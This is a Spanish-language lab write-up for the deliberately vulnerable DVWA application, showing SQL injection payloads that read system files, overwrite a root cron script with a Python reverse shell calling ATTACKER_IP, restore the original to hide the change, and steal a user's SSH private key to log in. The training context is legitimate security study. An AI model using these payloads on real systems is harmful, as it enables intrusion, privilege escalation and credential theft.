@@ -1,0 +1,141 @@
+===========================================================
+   WRITE-UP: Out-of-Band SQLi en DVWA
+   Plataforma: DVWA (Damn Vulnerable Web Application)
+   Módulo: SQL Injection
+   Security Level: Low
+===========================================================
+
+-----------------------------------------------------------
+EJERCICIO 1 - Cron Job Hijacking via SQLi
+-----------------------------------------------------------
+
+OBJETIVO:
+  Encontrar una tarea programada que ejecuta /tmp/backup.py
+  como root y modificarla para ejecutar código malicioso.
+
+PASO 1 - Listar el crontab
+  Payload:
+    1' AND false UNION SELECT 1, load_file('/etc/crontab')-- -
+
+  Resultado esperado:
+    * * * * * root python /tmp/backup.py
+  
+  Confirmamos que root ejecuta backup.py cada minuto.
+
+PASO 2 - Hacer copia de seguridad del original
+  Payload:
+    1' AND false UNION SELECT 1, load_file('/tmp/backup.py') 
+    INTO OUTFILE '/tmp/backup.py-2'-- -
+
+  Se guarda el archivo original antes de modificarlo.
+
+PASO 3 - Sobreescribir con código malicioso
+  Payload:
+    1' AND false UNION SELECT unhex('PAYLOAD_EN_HEX'), '' 
+    INTO OUTFILE '/tmp/backup.py'-- -
+
+  El payload en hex es el código malicioso, por ejemplo
+  una reverse shell en Python:
+    import os
+    os.system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
+
+  Generar hex del payload:
+    python3 -c "print(open('payload.py','rb').read().hex())"
+
+  Cuando root ejecute el cron, ejecutará nuestro código
+  con privilegios de root.
+
+PASO 4 - Restaurar el archivo original
+  Payload:
+    1' AND false UNION SELECT 1, load_file('/tmp/backup.py-2') 
+    INTO OUTFILE '/tmp/backup.py'-- -
+
+  Dejamos el sistema como estaba para no levantar sospechas.
+
+FLUJO RESUMIDO:
+  Leer crontab → Backup original → Inyectar payload 
+  → Esperar ejecución root → Restaurar
+
+
+-----------------------------------------------------------
+EJERCICIO 2 - Robo de clave SSH via Blind SQLi
+-----------------------------------------------------------
+
+OBJETIVO:
+  Confirmar SSH en puerto 22, listar usuarios del sistema,
+  robar la clave privada id_rsa y conectar por SSH.
+
+PASO 1 - Listar usuarios del sistema
+  Payload:
+    1' and false union select 1, load_file('/etc/passwd')-- -
+
+  Resultado relevante:
+    dvwa:x:1000:1000:dvwa,,,:/home/dvwa:/bin/bash
+    sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+
+  Identificamos:
+    - Usuario dvwa con home en /home/dvwa y shell bash
+    - Servicio SSH corriendo en el sistema
+
+PASO 2 - Confirmar configuración SSH (opcional)
+  Payload:
+    1' and false union select 1, load_file('/etc/ssh/sshd_config')-- -
+
+  Buscamos la línea: Port 22
+
+PASO 3 - Robar clave privada id_rsa
+  Payload:
+    1' and false union select 1, load_file('/home/dvwa/.ssh/id_rsa')-- -
+
+  Obtenemos:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEow...
+    -----END RSA PRIVATE KEY-----
+
+  NOTA: Para que LOAD_FILE pueda leer el archivo:
+    - El archivo debe tener permisos 644
+    - MySQL necesita secure_file_priv = ""
+    - La clave debe existir (generarla con ssh-keygen si no)
+
+  Generar la clave en la máquina víctima:
+    ssh-keygen -t rsa -b 2048 -f /home/dvwa/.ssh/id_rsa -N ""
+
+PASO 4 - Conectar por SSH desde Kali
+  # Guardar la clave robada
+    nano /tmp/id_rsa
+    (pegar el contenido de la clave)
+
+  # Dar permisos correctos
+    chmod 600 /tmp/id_rsa
+
+  # Conectar
+    ssh dvwa@10.0.2.5 -i /tmp/id_rsa
+
+FLUJO RESUMIDO:
+  /etc/passwd → identificar usuario → /home/dvwa/.ssh/id_rsa
+  → guardar clave → chmod 600 → ssh -i id_rsa
+
+
+-----------------------------------------------------------
+NOTAS GENERALES
+-----------------------------------------------------------
+
+  - AND false: fuerza a que la query original no devuelva
+    resultados para que solo veamos los nuestros.
+
+  - LOAD_FILE(): lee archivos del sistema si MySQL tiene
+    permisos FILE y secure_file_priv está vacío.
+
+  - INTO OUTFILE: escribe archivos en el sistema si MySQL
+    tiene permisos de escritura en el directorio destino.
+
+  - unhex(): permite pasar contenido en hexadecimal para
+    bypassear filtros de caracteres especiales.
+
+  - Las técnicas OOB son especialmente útiles cuando la
+    aplicación no muestra errores ni resultados directamente
+    (Blind SQLi).
+
+===========================================================
+EOF
+===========================================================
